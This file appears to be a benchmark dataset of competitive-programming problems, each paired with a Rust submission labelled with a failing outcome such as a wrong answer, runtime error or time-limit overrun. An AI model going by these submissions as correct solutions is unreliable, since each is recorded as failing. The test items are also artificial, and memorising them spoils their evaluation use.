{"difficulty":900,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"11_A","submission_id":"207834175","tags":["constructive+algorithms","implementation","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io;\r\n\r\nfn main() -> io::Result<()> {\r\n  let mut input = String::new();\r\n  io::stdin().read_line(&mut input).unwrap();\r\n\r\n  let first_line : Vec<_> = input.trim()\r\n    .split_whitespace()\r\n    .map(|x| x.parse::<usize>().unwrap()).collect();\r\n\r\n  let n = first_line[0];\r\n  let d = first_line[1];\r\n  let mut v : Vec<_> = vec![0;n];\r\n  for i in 0..n {\r\n    input.clear();\r\n    io::stdin().read_line(&mut input).unwrap();\r\n    v[i] = input.trim().parse::<usize>().unwrap();\r\n    \r\n  }\r\n  let mut count = 0;\r\n  \r\n  for i in 0..n-1 {\r\n    if v[i] >= v[i+1] {\r\n      let x = (v[i] - v[i + 1]) \/ d + 1;\r\n\t\t\tv[i + 1] += x*d;\r\n\t\t\tcount += x;\r\n    }\r\n  }\r\n   println!(\"{}\",count);\r\n  Ok(())\r\n    \r\n}\r\n\r\n\r\n\r\n","description":"A sequence a0,a1,...,at-1 is called increasing if ai-1<ai for each i:0<i<t.You are given a sequence b0,b1,...,bn-1 and a positive integer d. In each move you may choose one element of the given sequence and add d to it. What is the least number of moves required to make the given sequence increasing?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integer numbers n and d (2\u2264n\u22642000,1\u2264d\u226410^6). The second line contains space separated sequence b0,b1,...,bn-1 (1\u2264bi\u226410^6).\n","output_spec":"Output the minimal number of moves needed to make the sequence increasing.\n","notes":null,"sample_inputs":["4 2\n1 3 3 2\n"],"sample_outputs":["3\n"]}
{"difficulty":800,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"16_A","submission_id":"201374379","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io;\r\nfn all_same(s: &String) -> bool {\r\n    if s.len() <= 1 {\r\n        return true;\r\n    }\r\n    let fch: char = s.chars().next().unwrap();\r\n    for ch in s.chars().skip(1) {\r\n        if ch != fch {\r\n            return false;\r\n        }\r\n    }\r\n    true\r\n}\r\nfn all_diff(s: &String) -> bool {\r\n    if s.len() <= 1 {\r\n        return true;\r\n    }\r\n    let chars = s.chars().collect::<Vec<char>>();\r\n    for i in 0..s.len() {\r\n        for j in (i + 1)..s.len() {\r\n            if chars[i] == chars[j] {\r\n                return false;\r\n            }\r\n        }\r\n    }\r\n    true\r\n}\r\nfn main() {\r\n    let mut line = String::new();\r\n    io::stdin()\r\n        .read_line(&mut line)\r\n        .expect(\"Failed to read line\");\r\n\r\n    let inputs: Vec<u32> = line\r\n        .split_whitespace()\r\n        .map(|x| x.parse().expect(\"Failed to read\"))\r\n        .collect();\r\n\r\n    let n: usize = inputs[0] as usize;\r\n\r\n    let mut matrix: Vec<String> = vec![];\r\n    for _ in 0..n {\r\n        let mut str: String = String::new();\r\n        io::stdin()\r\n            .read_line(&mut str)\r\n            .expect(\"failed to read input.\");\r\n        matrix.push(str.trim().parse().expect(\"invalid input\"));\r\n    }\r\n    let mut str: String = Default::default();\r\n    for s in matrix.iter() {\r\n        str.push(s.chars().next().unwrap());\r\n    }\r\n    if all_diff(&str) == true {\r\n        for s in matrix.iter() {\r\n            if all_same(s) == false {\r\n                print!(\"NO\");\r\n                return;\r\n            }\r\n        }\r\n        print!(\"YES\");\r\n    } else {\r\n        print!(\"NO\");\r\n    }\r\n}\r\n","description":"According to a new ISO standard, a flag of every country should have a chequered field n\u00d7m, each square should be of one of 10 colours, and the flag should be \u00abstriped\u00bb: each horizontal row of the flag should contain squares of the same colour, and the colours of adjacent horizontal rows should be different. Berland's government asked you to find out whether their flag meets the new ISO standard.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains numbers n and m (1\u2264n,m\u2264100), n \u2014 the amount of rows, m \u2014 the amount of columns on the flag of Berland. Then there follows the description of the flag: each of the following n lines contain m characters. Each character is a digit between 0 and 9, and stands for the colour of the corresponding square.\n","output_spec":"Output YES, if the flag meets the new ISO standard, and NO otherwise.\n","notes":null,"sample_inputs":["3 3\n000\n111\n222\n","3 3\n000\n000\n111\n","3 3\n000\n111\n002\n"],"sample_outputs":["YES\n","NO\n","NO\n"]}
{"difficulty":1500,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"17_B","submission_id":"160821306","tags":["dfs+and+similar","dsu","greedy","shortest+paths"],"exec_outcome":"WRONG_ANSWER","source_code":"struct Scanner<R> {\n    reader: R,\n    line: Vec<u8>,\n    ptr: usize\n\n}\n\nimpl<R: std::io::BufRead> Scanner<R> {\n    fn new(reader: R) -> Self {\n        Self{reader, line: vec![], ptr: 0}\n    }\n\n    fn scan<T: std::str::FromStr>(&mut self) -> T {\n        loop {\n            while self.ptr < self.line.len() && self.line[self.ptr].is_ascii_whitespace() {\n                self.ptr += 1;\n            }\n            if self.ptr != self.line.len() {\n                let start = self.ptr;\n                while self.ptr < self.line.len() && !self.line[self.ptr].is_ascii_whitespace() {\n                    self.ptr += 1;\n                }\n                return std::str::from_utf8(&self.line[start..self.ptr]).unwrap().parse().ok().\n                    expect(\"parse error\");\n            }\n            self.line.clear();\n            self.reader.read_until(b'\\n', &mut self.line).expect(\"read error\");\n            self.ptr = 0;\n        }\n    }\n\n    fn line(&mut self) -> Vec<u8> {\n        if self.ptr == self.line.len() {\n            self.line.clear();\n            self.reader.read_until(b'\\n', &mut self.line).expect(\"read error\");\n            self.ptr = 0;\n        }\n        let result = self.line[self.ptr..].to_vec();\n        self.ptr = self.line.len();\n        return result;\n    }\n\n    fn eof(&mut self) -> bool {\n        loop {\n            while self.ptr < self.line.len() && self.line[self.ptr].is_ascii_whitespace() {\n                self.ptr += 1;\n            }\n            if self.ptr != self.line.len() {\n                return false;\n            }\n            self.line.clear();\n            self.ptr = 0;\n            if let Ok(0) = self.reader.read_until(b'\\n', &mut self.line) {\n                return true;\n            }\n        }\n    }\n\n}\n\nfn solve<R: std::io::BufRead, W: std::io::Write>(scanner: &mut Scanner<R>, writer: &mut W) {\n    let n: usize = scanner.scan();\n    let mut q: Vec<(usize, usize)> = (0..n).map(|id| (scanner.scan(), id)).collect();\n    let m: usize = scanner.scan();\n    let mut gr_inv = vec![Vec::new(); n];\n    for _ in 0..m {\n        let a = scanner.scan::<usize>() - 1;\n        let b = scanner.scan::<usize>() - 1;\n        let c: i64 = scanner.scan();\n        gr_inv[b].push((c, a));\n    }\n    q.sort_unstable();\n    for row in &mut gr_inv {\n        row.sort_unstable();\n    }\n    let mut result = 0;\n    let mut used = vec![false; n];\n    used[q[0].1] = true;\n    for i in 1..n {\n        let mut ok = false;\n        for &(val, id) in &gr_inv[q[i].1] {\n            if used[id] {\n                result += val;\n                used[q[i].1] = true;\n                ok = true;\n                break;\n            }\n        }\n        if !ok {\n            result = -1;\n            break;\n        }\n    }\n    writeln!(writer, \"{}\", result).unwrap();\n}\n\nfn main() {\n    let (stdin, stdout) = (std::io::stdin(), std::io::stdout());\n    let mut writer = std::io::BufWriter::new(stdout.lock());\n    let mut scanner = Scanner::new(stdin.lock());\n    let tests: usize = 1;\n    for _ in 0..tests {\n        solve(&mut scanner, &mut writer);\n    }\n}\n","description":"Nick's company employed n people. Now Nick needs to build a tree hierarchy of \u00absupervisor-surbodinate\u00bb relations in the company (this is to say that each employee, except one, has exactly one supervisor). There are m applications written in the following form: \u00abemployee ai is ready to become a supervisor of employee bi at extra cost ci\u00bb. The qualification qj of each employee is known, and for each application the following is true: qai>qbi. Would you help Nick calculate the minimum cost of such a hierarchy, or find out that it is impossible to build it.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2264n\u22641000) \u2014 amount of employees in the company. The following line contains n space-separated numbers qj (0\u2264qj\u226410^6)\u2014 the employees' qualifications. The following line contains number m (0\u2264m\u226410000) \u2014 amount of received applications. The following m lines contain the applications themselves, each of them in the form of three space-separated numbers: ai, bi and ci (1\u2264ai,bi\u2264n, 0\u2264ci\u226410^6). Different applications can be similar, i.e. they can come from one and the same employee who offered to become a supervisor of the same person but at a different cost. For each application qai>qbi.\n","output_spec":"Output the only line \u2014 the minimum cost of building such a hierarchy, or -1 if it is impossible to build it.\n","notes":"In the first sample one of the possible ways for building a hierarchy is to take applications with indexes 1, 2 and 4, which give 11 as the minimum total cost. In the second sample it is impossible to build the required hierarchy, so the answer is -1.\n","sample_inputs":["4\n7 2 3 1\n4\n1 2 5\n2 4 1\n3 4 1\n1 3 5\n","3\n1 2 3\n2\n3 1 2\n3 1 3\n"],"sample_outputs":["11\n","-1\n"]}
{"difficulty":1200,"lang":"Rust","lang_cluster":"rust","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_1531","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io::{self, BufRead};\n\nfn main() {\n    let stdin = io::stdin();\n    let mut lines = stdin.lock().lines();\n    let n = lines.next().unwrap().unwrap().parse::<usize>().unwrap();\n    let winnings: Vec<_> = lines.next().unwrap().unwrap().split(\" \").map(|s| s.parse::<i32>().unwrap()).collect();\n    let mut costs: Vec<_> = lines.next().unwrap().unwrap().split(\" \").enumerate().map(|(index, s)| (s.parse::<i32>().unwrap(), index)).collect();\n    costs.sort_by(|a, b| b.0.cmp(&a.0));\n    let mut current = 0;\n    let mut solution = vec![0; 5];\n    for amount in winnings.into_iter() {\n        current += amount;\n        for cost in costs.iter() {\n            let how_many = current \/ cost.0;\n            current %= cost.0;\n            solution[cost.1] += how_many;\n        }\n    }\n    for how_many in solution {\n        print!(\"{} \", how_many);\n    }\n    println!(\"\");\n    println!(\"{}\", current);\n}","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1400,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"24_A","submission_id":"170360317","tags":["graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::cmp::min;\n\nuse Direction::*;\n\n#[derive(Debug, Eq, PartialEq)]\nenum Direction { Direct, Reverse }\n\n#[derive(Debug)]\nstruct Road {\n    to: usize,\n    direction: Direction,\n    price: usize,\n}\n\nfn main() {\n    let stdin = std::io::stdin();\n\n    let mut buf = String::new();\n    stdin.read_line(&mut buf).unwrap();\n    let mut iter = buf.trim_end().split_whitespace();\n    let cities_count: usize = iter.next().unwrap().parse().unwrap();\n\n    let mut roads: Vec<Road> = Vec::with_capacity(cities_count);\n    for _ in 0..cities_count {\n        roads.push(Road {\n            to: 0,\n            direction: Direct,\n            price: 0,\n        })\n    }\n\n    for _ in 0..cities_count {\n        let mut buf = String::new();\n        stdin.read_line(&mut buf).unwrap();\n        let mut iter = buf.trim_end().split_whitespace();\n        let from:  usize = iter.next().unwrap().parse().unwrap();\n        let to:    usize = iter.next().unwrap().parse().unwrap();\n        let price: usize = iter.next().unwrap().parse().unwrap();\n\n        if roads[from - 1].to == 0 {\n            roads[from - 1] = Road { to, direction: Direct, price };\n        } else {\n            roads[to - 1] = Road { to: from, direction: Reverse, price };\n        }\n    }\n\n    let direct_total_price: usize = roads\n        .iter()\n        .filter(|road| road.direction == Reverse)\n        .map(|road| road.price)\n        .sum();\n    let reverse_total_price: usize = roads\n        .iter()\n        .filter(|road| road.direction == Direct)\n        .map(|road| road.price)\n        .sum();\n\n    println!(\"{}\", min(direct_total_price, reverse_total_price));\n}\n","description":"Nowadays the one-way traffic is introduced all over the world in order to improve driving safety and reduce traffic jams. The government of Berland decided to keep up with new trends. Formerly all n cities of Berland were connected by n two-way roads in the ring, i. e. each city was connected directly to exactly two other cities, and from each city it was possible to get to any other city. Government of Berland introduced one-way traffic on all n roads, but it soon became clear that it's impossible to get from some of the cities to some others. Now for each road is known in which direction the traffic is directed at it, and the cost of redirecting the traffic. What is the smallest amount of money the government should spend on the redirecting of roads so that from every city you can get to any other?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (3\u2264n\u2264100) \u2014 amount of cities (and roads) in Berland. Next n lines contain description of roads. Each road is described by three integers ai, bi, ci (1\u2264ai,bi\u2264n,ai\u2260bi,1\u2264ci\u2264100) \u2014 road is directed from city ai to city bi, redirecting the traffic costs ci.\n","output_spec":"Output single integer \u2014 the smallest amount of money the government should spend on the redirecting of roads so that from every city you can get to any other.\n","notes":null,"sample_inputs":["3\n1 3 1\n1 2 1\n3 2 1\n","3\n1 3 1\n1 2 5\n3 2 1\n","6\n1 5 4\n5 3 8\n2 4 15\n1 6 16\n2 3 23\n4 6 42\n","4\n1 2 9\n2 3 8\n3 4 7\n4 1 5\n"],"sample_outputs":["1\n","2\n","39\n","0\n"]}
{"difficulty":1300,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"25_A","submission_id":"215135821","tags":["brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::io;\nuse std::str::FromStr;\n\n#[allow(dead_code)]\nfn read_line() -> String {\n    let mut buffer = String::new();\n    io::stdin()\n        .read_line(&mut buffer)\n        .expect(\"failed to read line\");\n\n    buffer\n}\n\n#[allow(dead_code)]\nfn read<T: FromStr>() -> Result<T, T::Err> {\n    read_line().trim().parse::<T>()\n}\n\n#[allow(dead_code)]\nfn read_vec<T: FromStr>() -> Result<Vec<T>, T::Err> {\n    read_line()\n        .split_whitespace()\n        .map(|x| x.parse::<T>())\n        .collect()\n}\n\nfn main() {\n    let t = read::<usize>().unwrap();\n    let v = read_vec::<i32>().unwrap();\n    let mut ans = 1;\n\n    for i in 0..t {\n        let mut v_dif = Vec::new();\n\n        for j in 0..t {\n            if i == j {\n                continue;\n            }\n\n            let dif = (v[i] - v[j]).abs();\n            v_dif.push(dif);\n        }\n\n        let v_dif_dif = v_dif\n            .windows(2)\n            .map(|a| (a[0] - a[1]).abs())\n            .collect::<Vec<i32>>();\n\n        if v_dif_dif[0] % 2 == 0 && v_dif_dif.iter().min() == v_dif_dif.iter().max() {\n            ans = i + 1;\n            break;\n        }\n    }\n\n    println!(\"{ans}\");\n}\n","description":"Bob is preparing to pass IQ test. The most frequent task in this test is to find out which one of the given n numbers differs from the others. Bob observed that one number usually differs from the others in evenness. Help Bob \u2014 to check his answers, he needs a program that among the given n numbers finds one that is different in evenness.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (3\u2264n\u2264100) \u2014 amount of numbers in the task. The second line contains n space-separated natural numbers, not exceeding 100. It is guaranteed, that exactly one of these numbers differs from the others in evenness.\n","output_spec":"Output index of number that differs from the others in evenness. Numbers are numbered from 1 in the input order.\n","notes":null,"sample_inputs":["5\n2 4 7 8 10\n","4\n1 2 1 1\n"],"sample_outputs":["3\n","2\n"]}
{"difficulty":1200,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"27_A","submission_id":"224212582","tags":["implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"fn scan_str() -> String {\n    let mut n = String::new();\n    std::io::stdin().read_line(&mut n).unwrap();\n    n\n}\nfn main() {\n    let hours: usize = scan_str().trim().parse().unwrap();\n    let array : Vec<usize> = scan_str().trim().split_whitespace().map(|x| x.parse().unwrap()).collect();\n    let mut op = array[hours-1];\n\n    loop {\n        if !array.contains(&(op + 1)) {\n            println!(\"{}\",op +1);\n            break;\n        }\n        else {\n            op +=1;\n        }\n    }\n}\n    \n\n \t  \t \t\t \t\t\t   \t\t \t\t\t\t \t \t \t \t","description":"\u00abPolygon\u00bb is a system which allows to create programming tasks in a simple and professional way. When you add a test to the problem, the corresponding form asks you for the test index. As in most cases it is clear which index the next test will have, the system suggests the default value of the index. It is calculated as the smallest positive integer which is not used as an index for some previously added test.You are to implement this feature. Create a program which determines the default index of the next test, given the indexes of the previously added tests.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer n (1\u2264n\u22643000) \u2014 the amount of previously added tests. The second line contains n distinct integers a1,a2,...,an (1\u2264ai\u22643000) \u2014 indexes of these tests.\n","output_spec":"Output the required default value for the next test index.\n","notes":null,"sample_inputs":["3\n1 7 2\n"],"sample_outputs":["3\n"]}
{"difficulty":1000,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"37_A","submission_id":"224873971","tags":["sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::collections::HashMap;\r\nuse std::io;\r\n\r\nfn main() {\r\n    \/\/ Read input\r\n    let mut input = String::new();\r\n    io::stdin().read_line(&mut input).expect(\"Failed to read input\");\r\n    \r\n    let n: usize = input.trim().parse().expect(\"Invalid input\");\r\n    \r\n    let mut input = String::new();\r\n    io::stdin().read_line(&mut input).expect(\"Failed to read input\");\r\n    \r\n    let lengths: Vec<u32> = input\r\n        .split_whitespace()\r\n        .map(|x| x.parse().expect(\"Invalid input\"))\r\n        .collect();\r\n    \r\n    \/\/ Create a HashMap to count the occurrences of each length\r\n    let mut length_count = HashMap::new();\r\n    \r\n    for &length in &lengths {\r\n        *length_count.entry(length).or_insert(0) += 1;\r\n    }\r\n    \r\n    \/\/ Find the maximum count and the total number of distinct lengths\r\n    let (max_count, distinct_lengths) = length_count\r\n        .iter()\r\n        .map(|(&length, &count)| (count, length))\r\n        .max()\r\n        .unwrap();\r\n    \r\n    println!(\"{} {}\", max_count, distinct_lengths);\r\n}\r\n","description":"Little Vasya has received a young builder\u2019s kit. The kit consists of several wooden bars, the lengths of all of them are known. The bars can be put one on the top of the other if their lengths are the same.Vasya wants to construct the minimal number of towers from the bars. Help Vasya to use the bars in the best way possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer N (1\u2264N\u22641000) \u2014 the number of bars at Vasya\u2019s disposal. The second line contains N space-separated integers li \u2014 the lengths of the bars. All the lengths are natural numbers not exceeding 1000.\n","output_spec":"In one line output two numbers \u2014 the height of the largest tower and their total number. Remember that Vasya should use all the bars.\n","notes":null,"sample_inputs":["3\n1 2 3\n","4\n6 5 6 7\n"],"sample_outputs":["1 3\n","2 3\n"]}
{"difficulty":1500,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"39_J","submission_id":"186498464","tags":["hashing","implementation","strings"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"use std::fmt::Write as OtherWrite;\nuse std::io::{self, Write};\nuse std::io::{stdin, stdout};\nuse std::string;\n\nfn main() -> Result<(), io::Error> {\n    let reader = stdin();\n    let mut writer = stdout().lock();\n    let mut lines = reader.lines();\n    let s1 = lines.next().unwrap().unwrap();\n    let s2 = lines.next().unwrap().unwrap();\n    if let Some((index, repeat)) = solve(s1, s2) {\n        writeln!(writer, \"{repeat}\")?;\n        writeln!(\n            writer,\n            \"{}\",\n            (index + 1..index + 1 + repeat)\n                .map(|i| i.to_string())\n                .collect::<Vec<_>>()\n                .join(\" \")\n        )?;\n    } else {\n        writeln!(writer, \"{}\", 0)?;\n    }\n    Ok(())\n}\n\nfn solve(s1: String, s2: String) -> Option<(usize, usize)> {\n    let mut iter2 = s2.chars().peekable();\n    let mut result_index = None;\n    for (i, c1) in s1.chars().enumerate() {\n        if let Some(&c2) = iter2.peek() {\n            if c1 != c2 {\n                if result_index.is_some() {\n                    return None;\n                } else {\n                    result_index = Some(i);\n                }\n            } else {\n                iter2.next();\n            }\n        } else {\n            if (s1.chars().skip(i + 1).next()) == None {\n                return Some((i, 1));\n            } else {\n                return None;\n            }\n        }\n    }\n    let result_index = result_index?;\n    let mut iter1 = s1.chars().skip(result_index);\n    let c_result = iter1.next().unwrap();\n    return Some((\n        result_index,\n        iter1.take_while(|&c| c_result == c).count() + 1,\n    ));\n}\n","description":"Petya has noticed that when he types using a keyboard, he often presses extra buttons and adds extra letters to the words. Of course, the spell-checking system underlines the words for him and he has to click every word and choose the right variant. Petya got fed up with correcting his mistakes himself, that\u2019s why he decided to invent the function that will correct the words itself. Petya started from analyzing the case that happens to him most of the time, when all one needs is to delete one letter for the word to match a word from the dictionary. Thus, Petya faces one mini-task: he has a printed word and a word from the dictionary, and he should delete one letter from the first word to get the second one. And now the very non-trivial question that Petya faces is: which letter should he delete?","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains two strings, consisting of lower-case Latin letters. The length of each string is from 1 to 10^6 symbols inclusive, the first string contains exactly 1 symbol more than the second one.\n","output_spec":"In the first line output the number of positions of the symbols in the first string, after the deleting of which the first string becomes identical to the second one. In the second line output space-separated positions of these symbols in increasing order. The positions are numbered starting from 1. If it is impossible to make the first string identical to the second string by deleting one symbol, output one number 0.\n","notes":null,"sample_inputs":["abdrakadabra\nabrakadabra\n","aa\na\n","competition\ncodeforces\n"],"sample_outputs":["1\n3\n","2\n1 2\n","0\n"]}
{"difficulty":1000,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"43_A","submission_id":"211671287","tags":["strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io;\r\nuse std::collections::HashMap;\r\n\r\n\/* v1, faster but less about what we need to learn\r\nstruct TeamScore {\r\n    name : String,\r\n    score: usize\r\n}\r\n\r\nfn main() {\r\n    let handle = io::stdin();\r\n    let mut buf = String::new();\r\n    handle.read_line(&mut buf).unwrap();\r\n\r\n    let n : usize = buf.trim().parse().unwrap();\r\n\r\n    buf.clear();\r\n    handle.read_line(&mut buf).unwrap();\r\n    let mut team1 = TeamScore{ name: buf.trim().to_string(), score: 1};\r\n    buf.clear();\r\n    let mut team2 = TeamScore{ name: String::new(), score: 0};\r\n    for _ in 1..n {\r\n        handle.read_line(&mut buf).unwrap();\r\n        if buf.trim() == team1.name {\r\n            team1.score += 1;\r\n        } else {\r\n            if team2.name.len() == 0 {\r\n                team2.name = buf.trim().to_string();\r\n            }\r\n            team2.score += 1;\r\n        }\r\n\r\n        buf.clear();\r\n    }\r\n\r\n    if team1.score > team2.score {\r\n        println!(\"{}\", team1.name);\r\n    } else {\r\n        println!(\"{}\", team2.name);\r\n    }\r\n}\r\n*\/\r\n\r\nfn main() {\r\n    let mut scores : HashMap<String, usize> = HashMap::new();\r\n    let handle = io::stdin();\r\n    let mut buf = String::new();\r\n    handle.read_line(&mut buf).unwrap();\r\n\r\n    let n : usize = buf.trim().parse().unwrap();\r\n\r\n    for _ in 0..n {\r\n        handle.read_line(&mut buf).unwrap();\r\n        *scores.entry(buf.trim().to_string()).or_default() += 1;\r\n        buf.clear();\r\n    }\r\n\r\n    let entry = scores.iter().max_by_key(|&(_k,v)| v).unwrap();\r\n    println!(\"{}\", entry.0);\r\n}\r\n","description":"One day Vasya decided to have a look at the results of Berland 1910 Football Championship\u2019s finals. Unfortunately he didn't find the overall score of the match; however, he got hold of a profound description of the match's process. On the whole there are n lines in that description each of which described one goal. Every goal was marked with the name of the team that had scored it. Help Vasya, learn the name of the team that won the finals. It is guaranteed that the match did not end in a tie.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u2264100) \u2014 the number of lines in the description. Then follow n lines \u2014 for each goal the names of the teams that scored it. The names are non-empty lines consisting of uppercase Latin letters whose lengths do not exceed 10 symbols. It is guaranteed that the match did not end in a tie and the description contains no more than two different teams.\n","output_spec":"Print the name of the winning team. We remind you that in football the team that scores more goals is considered the winner.\n","notes":null,"sample_inputs":["1\nABC\n","5\nA\nABA\nABA\nA\nA\n"],"sample_outputs":["ABC\n","A\n"]}
{"difficulty":1300,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"4_C","submission_id":"191180221","tags":["data+structures","hashing","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"use std::collections::HashMap;\r\nuse std::io;\r\n\r\nfn main() {\r\n    let mut name_count = HashMap::new();\r\n    let mut names = Vec::new();\r\n\r\n    let mut n = String::new();\r\n    io::stdin().read_line(&mut n).unwrap();\r\n    let n = n.trim().parse::<usize>().unwrap();\r\n\r\n    for _ in 0..n {\r\n        let mut name = String::new();\r\n        io::stdin().read_line(&mut name).unwrap();\r\n        let name = name.trim().to_owned();\r\n\r\n        let count = name_count.entry(name.clone()).or_insert(0);\r\n        *count += 1;\r\n\r\n        let formatted_name = if *count > 1 {\r\n            format!(\"{}({})\", name, count)\r\n        } else {\r\n            name\r\n        };\r\n\r\n        names.push(formatted_name);\r\n    }\r\n\r\n    for name in names {\r\n        println!(\"{}\", name);\r\n    }\r\n}\r\n","description":"A new e-mail service \"Berlandesk\" is going to be opened in Berland in the near future. The site administration wants to launch their project as soon as possible, that's why they ask you to help. You're suggested to implement the prototype of site registration system. The system should work on the following principle. Each time a new user wants to register, he sends to the system a request with his name. If such a name does not exist in the system database, it is inserted into the database, and the user gets the response OK, confirming the successful registration. If the name already exists in the system database, the system makes up a new user name, sends it to the user as a prompt and also inserts the prompt into the database. The new name is formed by the following rule. Numbers, starting with 1, are appended one after another to name (name1, name2, ...), among these numbers the least i is found so that namei does not yet exist in the database.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n (1\u2264n\u226410^5). The following n lines contain the requests to the system. Each request is a non-empty line, and consists of not more than 32 characters, which are all lowercase Latin letters.\n","output_spec":"Print n lines, which are system responses to the requests: OK in case of successful registration, or a prompt with a new name, if the requested name is already taken.\n","notes":null,"sample_inputs":["4\nabacaba\nacaba\nabacaba\nacab\n","6\nfirst\nfirst\nsecond\nsecond\nthird\nthird\n"],"sample_outputs":["OK\nOK\nabacaba1\nOK\n","OK\nfirst1\nOK\nsecond1\nOK\nthird1\n"]}
{"difficulty":900,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"52_A","submission_id":"207838539","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io;\r\n\r\nfn main() -> io::Result<()> {\r\n  let mut input = String::new();\r\n  io::stdin().read_line(&mut input).unwrap();\r\n\r\n  let n : usize = input.trim().parse().unwrap();\r\n  \r\n  let mut v : Vec<_> = vec![0;n];\r\n  for i in 0..n {\r\n    input.clear();\r\n    io::stdin().read_line(&mut input).unwrap();\r\n    v[i] = input.trim().parse::<usize>().unwrap();\r\n    \r\n  }\r\n  let mut one = 0;\r\n  let mut two = 0;\r\n  let mut three = 0;\r\n  for i in v {\r\n    if i == 1 {\r\n      one+=1;\r\n    } else if i == 2 {\r\n      two+=1;\r\n    } else {\r\n      three+=1;\r\n    }\r\n  }\r\n\r\n  \r\n  println!(\"{}\",one+two+three - one.max(two).max(three));\r\n  Ok(())\r\n    \r\n}","description":"There is a given sequence of integers a1,a2,...,an, where every number is from 1 to 3 inclusively. You have to replace the minimum number of numbers in it so that all the numbers in the sequence are equal to each other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u226410^6). The second line contains a sequence of integers a1,a2,...,an (1\u2264ai\u22643).\n","output_spec":"Print the minimum number of replacements needed to be performed to make all the numbers in the sequence equal.\n","notes":"In the example all the numbers equal to 1 and 3 should be replaced by 2.\n","sample_inputs":["9\n1 3 2 2 2 1 1 2 3\n"],"sample_outputs":["5\n"]}
